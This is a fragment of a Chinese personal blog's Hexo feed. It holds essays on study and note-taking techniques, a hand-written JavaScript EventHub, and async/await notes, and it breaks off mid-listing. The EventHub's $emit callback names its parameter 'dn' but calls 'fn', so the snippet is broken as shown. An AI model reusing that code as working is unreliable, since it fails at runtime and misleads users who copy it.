      <title>学习之道-基础知识学习技巧</title>
      <link href="/Blog/2021/05/22/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2021/05/22/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h1 id="欧阳修三上之功"><a href="#欧阳修三上之功" class="headerlink" title="欧阳修三上之功"></a>欧阳修三上之功</h1><p><a href="https://baike.baidu.com/item/%E4%B8%89%E4%B8%8A%E4%B9%8B%E5%8A%9F">欧阳修《归田录》</a></p><blockquote><p>马上，枕上，厕上</p></blockquote><h1 id="费曼学习法"><a href="#费曼学习法" class="headerlink" title="费曼学习法"></a>费曼学习法</h1><p><a href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E8%B2%BB%E6%9B%BC">最有效的学习法</a></p><blockquote><p>概念、教给别人、评价（回顾）、简化</p></blockquote><h1 id="互联网学习法"><a href="#互联网学习法" class="headerlink" title="互联网学习法"></a>互联网学习法</h1><ul><li>非常鸡贼的学习方法</li></ul><blockquote><p>比如说你想买一个耳机， 不知道买哪一款，于是就在网络上提问，200块钱能买什么好耳机，当然得到的回复基本都是：200块钱还想买耳机？200块钱只能听个响，你不知道xx万的耳机？<br>但是如果你说  200 块钱以下的耳机都是垃圾，就也有可能得到回复：你知不知道 xx 耳机， 才199，我用了两年了音质，降噪都不错。</p></blockquote><h1 id="类比法"><a href="#类比法" class="headerlink" title="类比法"></a>类比法</h1><ul><li>用生活实践解释代码</li><li>节流与防抖</li><li>DDos</li></ul><blockquote><p>拿节流和防抖举例子。节流：就像是技能有一段 cd 时间。防抖：技能吟唱时间，如果被人打断了，又得重新开始吟唱。</p></blockquote><h1 id="推演法"><a href="#推演法" class="headerlink" title="推演法"></a>推演法</h1><ul><li><strong>用三段逻辑推演</strong></li><li>例如：<ul><li>A：所有水果都是植物</li><li>B：橘子是水果</li><li>C：总结：橘子是植物</li></ul></li><li><strong>JS 原型的一个例子</strong><ul><li>A：JS所有的函数都是 Function 构造出来的</li><li>B：Function 是一个函数</li><li>C：总结：Function 是 Function 构造出来的</li></ul></li></ul><blockquote><p>有些时候是没有逻辑的（你认为）。<br>如果你相信三段式，你就要真的相信他，不管三段式推出什么样的结果，你都要相信这结果确实是真的，只要你能保证 A 和 B 是真的，C 一定是真的。</p></blockquote><h1 id="构建知识树"><a href="#构建知识树" class="headerlink" title="构建知识树"></a>构建知识树</h1><ul><li>学习大局观</li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习之道-如何记笔记</title>
      <link href="/Blog/2021/05/18/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%A6%82%E4%BD%95%E8%AE%B0%E7%AC%94%E8%AE%B0/index/"/>
      <url>/Blog/2021/05/18/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%A6%82%E4%BD%95%E8%AE%B0%E7%AC%94%E8%AE%B0/index/</url>
      
        <content type="html"><![CDATA[<h1 id="不记笔记会怎么样"><a href="#不记笔记会怎么样" class="headerlink" title="不记笔记会怎么样"></a>不记笔记会怎么样</h1><ul><li><strong>看书不记笔记</strong></li><li>白看了</li><li><strong>看 Vue &#x2F; React 不记笔记</strong></li><li>白看了</li><li><strong>记笔记的意义</strong></li><li>在自己的大脑中设立一个地标</li><li>你实际上在构建自己的记忆宫殿</li></ul><h1 id="康奈尔笔记法"><a href="#康奈尔笔记法" class="headerlink" title="康奈尔笔记法"></a>康奈尔笔记法</h1><ul><li>Cornell Notes</li><li><a href="https://zh.wikipedia.org/zh-hans/%E5%BA%B7%E5%A5%88%E5%B0%94%E7%AC%94%E8%AE%B0%E6%B3%95">链接</a></li><li>《如何在大学学习》一书提到的方法</li><li>是由康奈尔大学的教授沃尔特发明的基笔记法</li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="/Blog/2021/05/18/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%A6%82%E4%BD%95%E8%AE%B0%E7%AC%94%E8%AE%B0/index/img.png" alt="左右关键词，右边笔记"></p><ul><li><strong>特点</strong></li><li>结构：左右下，三分区</li><li>右边：用于记录</li><li>左边：索引与自我答疑</li><li>下边：总结</li><li><strong>疑问</strong></li><li>内容太多咋办？</li><li>答：拓展为两页纸</li></ul><p><img src="/Blog/2021/05/18/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%A6%82%E4%BD%95%E8%AE%B0%E7%AC%94%E8%AE%B0/index/img_1.png" alt="通俗来说"></p><h1 id="东京大学笔记法"><a href="#东京大学笔记法" class="headerlink" title="东京大学笔记法"></a>东京大学笔记法</h1><p><img src="/Blog/2021/05/18/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%A6%82%E4%BD%95%E8%AE%B0%E7%AC%94%E8%AE%B0/index/img_2.png"></p><blockquote><p>竟然就是康奈尔的镜像，也不知道是谁发明的，网上找不到。</p></blockquote><blockquote><p>这俩笔记法如此相像<br>发现与提出疑问很重要<br>总结很重要<br>聪明的人总能找到类似的解决方法</p></blockquote><h1 id="吐糟笔记法"><a href="#吐糟笔记法" class="headerlink" title="吐糟笔记法"></a>吐糟笔记法</h1><ul><li><strong>最简单的办法</strong></li><li>将老师的讲的内容简述出来</li><li>然后揶揄、讽刺、嘲笑的语气发布在公共空间</li><li><strong>举例</strong></li><li>今天的康奈尔笔记法和东京大学笔记法都是三个分区，区别不过就是左撇子和右撇子的区别嘛</li><li>康奈尔笔记法的发明者居然不叫康奈尔，而是沃尔特，而康奈尔是这所学校的名字啊</li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写eventhub</title>
      <link href="/Blog/2021/05/13/javascript/%E6%89%8B%E5%86%99eventhub/index/"/>
      <url>/Blog/2021/05/13/javascript/%E6%89%8B%E5%86%99eventhub/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">EventHub</span> <span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.events = &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EventHub.prototype.$on = <span class="keyword">function</span><span class="params">(name, fn)</span> &#123;</span><br><span class="line">  (<span class="keyword">this</span>.events[name] || (<span class="keyword">this</span>.events[name] = [])).push(fn)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EventHub.prototype.$emit = <span class="keyword">function</span> <span class="params">(name, <span class="rest_arg">...args</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">this</span>.events[name] &amp;&amp; <span class="keyword">this</span>.events[name].map(dn =&gt; fn.call(<span class="literal">undefined</span>, ...args))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EventHub.prototype.$off = <span class="keyword">function</span> <span class="params">(name, fn)</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> events = <span class="keyword">this</span>.events[name] &amp;&amp; <span class="keyword">this</span>.events[name].filter(v =&gt; v !== fn)</span><br><span class="line">  <span class="keyword">if</span> (events) &#123;</span><br><span class="line">    <span class="keyword">if</span> (events.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">delete</span> <span class="keyword">this</span>.events[name]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.events[name] = events</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习之道-学习技巧</title>
      <link href="/Blog/2021/05/10/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2021/05/10/essay/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%81%93-%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h1 id="学习技巧"><a href="#学习技巧" class="headerlink" title="学习技巧"></a>学习技巧</h1><h2 id="遗忘曲线"><a href="#遗忘曲线" class="headerlink" title="遗忘曲线"></a>遗忘曲线</h2><blockquote><p>帮助你认识自己。<br>1.不要因为忘了而责怪自己。<br>2.如果想不忘，过几天再翻看一遍（记笔记）。</p></blockquote><h2 id="成就感"><a href="#成就感" class="headerlink" title="成就感"></a>成就感</h2><blockquote><p>你学不过越学越快乐的那些人<br>也就是正反馈–你学一个东西的时候（学习 &#x3D;&gt; 爽 &#x3D;&gt; 快乐 &#x3D;&gt; 学习 &#x3D;&gt; …）<br>正常来说学习的时候会分泌多巴胺（人类基因）。不喜欢学习是因为被九年义务教育恶心到了，那种为了考试把一些东西强加在你身上。<br>实际上学习是很快乐的，比如说在刷微博也是学习，了解到了娱乐八卦信息，越刷越开心，比如说刷知乎，知乎也有东西让你开心。<br>但是这种开心太小了，开心一会儿就没了，不能让你形成积累下来的知识，所以就需要成就感了。<br>比如我在一开始学习命令行的时候，命令行有什么用呢，没有任何成就感，没有成就感就会通过遗忘曲线，命令行知识就会逐渐消散，所以我做了一个 hexo 的博客，无形之中创建了关联，我学命令行，通过了命令行创建了世界上所有人都能访问的博客系统，这就是成就感，有了成就感就会继续学习。</p></blockquote><h2 id="生物钟"><a href="#生物钟" class="headerlink" title="生物钟"></a>生物钟</h2><h3 id="固定时间"><a href="#固定时间" class="headerlink" title="固定时间"></a>固定时间</h3><blockquote><p>最怕三天打鱼两天晒网那种行为，最怕半途而废。<br>很多时候我们在 steam 上买了一款游戏，可能刚开始玩了一会儿，之后发现还没其他事情，就在再也没玩了，于是这个游戏就变成了喜加一<br>游戏都没有兴趣长时间玩下去，更不用说学习了。<br>但是什么游戏能一直玩呢，比如说午休的时候，和朋友一起打把王者荣耀，下班了一起再打一把，每天就是这样的固定时间。</p></blockquote><h3 id="固定精力"><a href="#固定精力" class="headerlink" title="固定精力"></a>固定精力</h3><blockquote><p>和时间是不关联的，比如说下班后去打球了，一身汗，这个时候即使到了学习时间，也是精力不足的，这种就是垃圾时间，只能做一些无意义的事情，如洗澡、看剧…</p></blockquote><h3 id="就学五分钟学习法"><a href="#就学五分钟学习法" class="headerlink" title="就学五分钟学习法"></a>就学五分钟学习法</h3><blockquote><p>目前最流行的就是，番茄工作法，<br>番茄工作法就是学习五分钟，休息娱乐五分钟，再学习五分钟…，听起来很美好。<br>但是<strong>非常不推荐编程用来编程学习</strong>，五分钟刚搭建完环境，时间就到了，那还搞啥，编程学习时间段至少得1个小时。<br>所以方法是一定要骗自己就学5分钟，学完5分钟就去玩，但是每次的实际情况是，一旦学了五分钟，就会继续下去。</p></blockquote><h2 id="制造不方便的环境"><a href="#制造不方便的环境" class="headerlink" title="制造不方便的环境"></a>制造不方便的环境</h2><blockquote><p>比如说经常在学习的时候，经常学着学着玩一下手机、擦一下屏幕、没喝水喝一下水</p></blockquote><h3 id="电脑不装显卡"><a href="#电脑不装显卡" class="headerlink" title="电脑不装显卡"></a>电脑不装显卡</h3><blockquote><p>就像 mac 一样（手动狗头），显卡非常不适合玩游戏，我用 mac 打 DOTA 的时候卡的像 PPT，风扇声音像飞机场一下，所以 mac 能让你有效学习。</p></blockquote><h3 id="锁门防止打扰"><a href="#锁门防止打扰" class="headerlink" title="锁门防止打扰"></a>锁门防止打扰</h3><blockquote><p>比如说在家学习的时候，父母来让你收一下衣服，搬一下东西，这个时候锁门，就会避免一些干扰</p></blockquote><h3 id="去咖啡馆防止打游戏"><a href="#去咖啡馆防止打游戏" class="headerlink" title="去咖啡馆防止打游戏"></a>去咖啡馆防止打游戏</h3><blockquote><p>比如说去星巴克学习，有电源，有 wifi，谁都不认识你，一般不会被人打扰，安心学习，更不用说打游戏，一般没见过有谁在星巴克打绝地求生、DOTA…，<strong>这样子像个傻子</strong></p></blockquote><h2 id="准备好糖分和水分"><a href="#准备好糖分和水分" class="headerlink" title="准备好糖分和水分"></a>准备好糖分和水分</h2><h3 id="不要频繁起身拿东西"><a href="#不要频繁起身拿东西" class="headerlink" title="不要频繁起身拿东西"></a>不要频繁起身拿东西</h3><blockquote><p>虽然在学习的时候身体没有动，看起来没有很大的消耗，但是大脑看着看着就睡着了，比如说一个东西很难懂，很难去理解，大脑在长期的工作下就会昏昏欲睡，可能有一部分原因就是糖分不足，可以搞个快乐水，奶茶放在旁边</p></blockquote><h3 id="每小时起身一次"><a href="#每小时起身一次" class="headerlink" title="每小时起身一次"></a>每小时起身一次</h3><blockquote><p>但是又不能做太久，防止脊椎病</p></blockquote><h2 id="你需要考试"><a href="#你需要考试" class="headerlink" title="你需要考试"></a>你需要考试</h2><h3 id="自己问自己"><a href="#自己问自己" class="headerlink" title="自己问自己"></a>自己问自己</h3><blockquote><p>平时自己疯狂学习，觉得自己学的很好了，但是一到工作中遇到各种意外之外的情况就各种不会了，因为自学的时候是自己跟自己在知识建设，需要一个外部力量来检验自己，让别人出一个题来考你，这样才知道是否学好。<br>比如可以网上刷题</p></blockquote><h2 id="自我催眠"><a href="#自我催眠" class="headerlink" title="自我催眠"></a>自我催眠</h2><h3 id="有效防止拖延"><a href="#有效防止拖延" class="headerlink" title="有效防止拖延"></a>有效防止拖延</h3><blockquote><p>有一次我看过一本书，这本书让你戒烟（我自己不抽烟，看完了也依旧不抽烟），但是我发现一个东西，怎么自己催眠自己，这本书就是催眠，让你自己发现抽烟是一件愚蠢的事情，通过理性的分析甚至感性的，还有社会学的角度让你知道抽烟是一键愚蠢的事情，他论证了这件事，让你不知不觉就相信了这件事情。<br>这本书不是直接告诉你吸烟有害身体，作者说我以前也抽过烟，我问过一些烟瘾者，他们说抽烟能让自己更精神，然后这本书的作者说，不是抽烟的时候更精神，是你不抽烟的时候会困，抽烟的时候才会返回正常状态，所以实际上为什么能让你爽呢？是你不抽烟的时候难受，抽烟的时候正常，所说你爽了。那麽为什么正常人不需要抽烟呢？因为正常人本来就在正常状态下，一直都在烟瘾者的抽烟状态下，那为什么需要去抽烟呢。让你知道原来是上了烟的当，抽烟的时候并不是爽，而是把我的不爽去除了而已。<br>就像电子鸦片一样，游戏为什么能让那些人爽呢？比如说当年的传奇，上线送你一些装备，让你打怪，秒杀的感觉很爽，突然有一天到了一定的等级，他不送装备了，然后打怪好难，出门还要被其他冲钱买装备的人杀，来欺负你，这个时候你又两个选择，1.冲钱，2.不玩这个游戏。但是这个游戏你已经玩了半年了，很难做到不玩了，所以如果你想回到那种感觉（刷怪很爽，欺负其他玩家）。雷同烟一样。<br>但这和拖延有什么关系呢，理性分析一下，是不是大家都认为自己有拖延症，<strong>如果大家都有拖延症，那么这到底算不算一个病？</strong>所有人都有拖延症，一直得，而且都去除不了，不像感冒，也所有人都有，但是能祛除。所以请问拖延症还算一种病吗？<br>结论：既然每个人都有，所以他不是病，那既然不是病，那我们为什么要去除呢？我们不需要防止拖延，通过这样子的心理建设，你就知道了我没有拖延，我只是不想去做而已，比如说那为什么还老是去刷微博，打游戏，很简单那就是那个时候不想去学习，那就尽管去玩好了，<strong>但是不能在学习的过程中想着去玩</strong>，就把剧看烂了，无聊了，那么就可以回到上述方法，那就去学习5分钟把。（有点和上面的自我催眠冲突，但是有时候也要实际一点，学习到一定时间学不下去了，那就尽管玩把）</p></blockquote><h2 id="分析自己的学习类型"><a href="#分析自己的学习类型" class="headerlink" title="分析自己的学习类型"></a>分析自己的学习类型</h2><blockquote><p>每个人的学习类型是不一样的，这是某个学者研究出来的，有的人通过 <strong>视觉、听觉、触觉、嗅觉</strong>。<br>有的人能通过视觉就能学习，就就是我们所谓的学霸，学霸通过看老师的板书或者看一些笔记，他就能快速吸一些知识，这种人在九年义务教育中学习就是非常轻松的。<br>但是其他人就不行了，很多是希望通过听觉来学习。什么是听觉呢？我必须通过老师来讲一遍，如果老师不讲，让我自己看，我就看不懂，这个也被叫做阅读障碍患者，直白的说就是我听能听懂，但是就是看不懂。<br>还有人通过触觉来学习，这种人看也看不懂，听也听不懂，必须自己试过才知道，比如学物理，必须去往墙上打一拳被墙弹回来才能理解力的作用，这种人更适合学习体育或者乐器。<br>少有人通过嗅觉来学习，就是没有味道某种香味就学习不下去，要是味到了，就能静下心来再学习。<br>为什么要找类型呢？因为你会经常在网上看到一种论调：学习？学习就要看书，书都看不懂，你就不是学习编程的料。但是所有人不是一样，有的人就是做过一遍之后才能理解，才能学懂，找到自己的学习类型。</p></blockquote><h2 id="目标管理"><a href="#目标管理" class="headerlink" title="目标管理"></a>目标管理</h2><blockquote><p>不管你的学习技巧多那么，如果你没有目标，你就存在一个失去焦点的问题，或者迷路的问题。</p></blockquote><h3 id="不要制定宏大的目标"><a href="#不要制定宏大的目标" class="headerlink" title="不要制定宏大的目标"></a>不要制定宏大的目标</h3><blockquote><p>有的人喜欢制定任务计划表（不一定适合所有人），这一周干啥，下一周干啥。但是一旦一周没有完成目标，那么这张计划表就废了，你会觉得自己再也完不成了，第二周都没学完，第三周的任务更不可能按时按成了，<strong>制定的目标太宏大，太细致或者说太死</strong>，造成你容易产生逆反心理，可能甚至会觉得自己不行。</p></blockquote><h3 id="日拱一卒，不期速成"><a href="#日拱一卒，不期速成" class="headerlink" title="日拱一卒，不期速成"></a>日拱一卒，不期速成</h3><blockquote><p>我们要制定的是：根据上面说的<strong>固定时间</strong>，每个时间段我们要做什么，做到某一个程度就行了，比如说我<strong>每段时间</strong>就看10页书，当你某一周只看了5页，并没有关系，那我下周再看5页好了，具体每周做到哪儿我不关心，主要在于我是否保持一个学习的状态，速成是一个很假的东西，<strong>就像赌博，赌博的危害是什么，不是说把你的钱花光了，而是说一但你赌博赌赢了，你就再也不会去每个月老老实实拿那点工资了</strong>，是吧，直接把你心态搞崩了。</p></blockquote><h3 id="目标可实施"><a href="#目标可实施" class="headerlink" title="目标可实施"></a>目标可实施</h3><blockquote><p>比如说我想用 JS 写点东西，比如说做一个好看的弹窗，那么可以去做一下试试（虽然是小东西，想做完美还是很难的，其中会遇到各种各样的问题）。</p></blockquote><h3 id="如果达到目标，就告诉大家"><a href="#如果达到目标，就告诉大家" class="headerlink" title="如果达到目标，就告诉大家"></a>如果达到目标，就告诉大家</h3><blockquote><p>比如说做好了那个弹窗，就发布到 github，拿到论坛里给大家用一下（可能会没人用），但是只要你告诉别人就行了，就相当于给了自己一个交代。</p></blockquote><h3 id="不要在意完美，搞定即可"><a href="#不要在意完美，搞定即可" class="headerlink" title="不要在意完美，搞定即可"></a>不要在意完美，搞定即可</h3><blockquote><p>有些人在学习的过程中太刻意追求完美，比如说在学习 JS 的时候，要记住，用到所有的 API，学 CSS 的时候，要记住所有的选择器，每个东西都搞清楚。有这个想法就是错的，因为你没有那么多的时间和精力去搞明白，根据上面说的<strong>遗忘曲线</strong>，CSS 几百几千个选择器，一次给你说完了，过短时间你还是会逐渐忘记，到后来就会怀疑自己为什么这么辛苦学完了，到最后还是忘记了，所以遗忘曲线是最最重要的东西，能让你保持信心。</p></blockquote><h3 id="回顾很重要"><a href="#回顾很重要" class="headerlink" title="回顾很重要"></a>回顾很重要</h3><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><hr><blockquote><p>看完上面之后，现在回顾一下还记得那些学习方法（沉默时间，找个空白<strong>写（触觉学习）</strong>一下关键词，关键词即可，根据遗忘曲线，二十分钟你就会忘了大部分）<br>上述10个知识点，根据遗忘曲线，在30天之后，你只会遗忘80%，剩下只会记得两个知识点（像我初次写下时，就记得了遗忘曲线和就学5分钟）。<br>那为什么要讲这么多呢？就说重点不就好了么？因为每个人的习惯不同，每个人的记忆点不同，就像 QQ 一样很臃肿，有很多功能你都用不上，那为什么 QQ 不砍了这些功能呢？因为这些功能正在被其他人使用，如果砍了他们就会有意见。这些技巧也是一样。会被不同的人记住不同的点。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>async await 全解</title>
      <link href="/Blog/2021/05/09/javascript/async-await%E5%85%A8%E8%A7%A3/index/"/>
      <url>/Blog/2021/05/09/javascript/async-await%E5%85%A8%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<p>####前端似乎对 Promise 不满</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><h6 id="Async-x2F-Await替代Promise的6个理由"><a href="#Async-x2F-Await替代Promise的6个理由" class="headerlink" title="Async&#x2F;Await替代Promise的6个理由"></a><a href="https://blog.fundebug.com/2017/04/04/nodejs-async-await/">Async&#x2F;Await替代Promise的6个理由</a></h6><p>但是，除了更简洁意外，其他理由似乎都不是很有说服力。</p><h3 id="为什么需要-async-？"><a href="#为什么需要-async-？" class="headerlink" title="为什么需要 async ？"></a>为什么需要 async ？</h3><blockquote><p>看起来非常多余，await 所在的函数就是 async ，不是吗？</p></blockquote><p>已经搜索发现，在 await 之前，<strong>已经有人实现了 await 函数</strong>，她的函数是这样的：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">fn</span> ()</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span>(xxx())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果 JS 一发布这个语法，那么这个人就不能继续运行她的代码了，所以为了避免这种情况，JS 只能强行加一个 async 关键词（虽然没有任何实质意义）作区分（用心良苦，为了兼容旧代码里普通函数的await），继而保证大家都能使用。</p><h3 id="如何优雅的处理错误"><a href="#如何优雅的处理错误" class="headerlink" title="如何优雅的处理错误"></a>如何优雅的处理错误</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ajax = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">reject</span>(&#123; <span class="attr">status</span>: <span class="number">403</span>, <span class="attr">message</span>: <span class="string">&#x27;无权限&#x27;</span> &#125;)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">errHandler</span> = err =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">  <span class="keyword">throw</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fn</span> () &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">ajax</span>().<span class="title function_">catch</span>(errHandler)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;继续运行接下来的代码&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure><blockquote><p>上述的 errHandler 之所以最后 throw err 是因为，如果直接 return 一个值，会被直接赋值给 res，所以直接使用 throw err 还能打断程序进程，防止下面的代码继续运行。</p></blockquote><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><h5 id="具有传染性"><a href="#具有传染性" class="headerlink" title="具有传染性"></a>具有传染性</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>)</span><br><span class="line">await <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><blockquote><p>console.log(3) 变成异步任务了，<br>Promise 同样具有传染性，then 里面都是异步，除非直接写在 下面。<br>谁没有传染性：回调。</p></blockquote><h5 id="天生串行"><a href="#天生串行" class="headerlink" title="天生串行"></a>天生串行</h5><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">await</span> <span class="function"><span class="title">ajax1</span>()</span></span><br><span class="line"><span class="variable">await</span> <span class="function"><span class="title">ajax2</span>()</span></span><br><span class="line"><span class="variable">await</span> <span class="function"><span class="title">ajax3</span>()</span></span><br><span class="line"><span class="variable">await</span> <span class="function"><span class="title">ajax4</span>()</span></span><br></pre></td></tr></table></figure><h4 id="其中有一个陷阱关于循环的陷阱"><a href="#其中有一个陷阱关于循环的陷阱" class="headerlink" title="其中有一个陷阱关于循环的陷阱"></a>其中有一个陷阱关于循环的陷阱</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const ajax1 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;ajax1&#x27;</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">const ajax2 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;ajax2&#x27;</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">const ajax3 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Promise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;ajax3&#x27;</span>)</span><br><span class="line">    resolve()</span><br><span class="line">  &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;)</span><br><span class="line">const fn = async () =&gt; &#123;</span><br><span class="line">  const <span class="built_in">array</span> = [ajax1, ajax2, ajax3];</span><br><span class="line">  <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="built_in">array</span>.<span class="built_in">length</span>; i++) &#123;</span><br><span class="line">    await <span class="built_in">array</span>[i]()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><blockquote><p>用普通的 for 循环是正常的</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 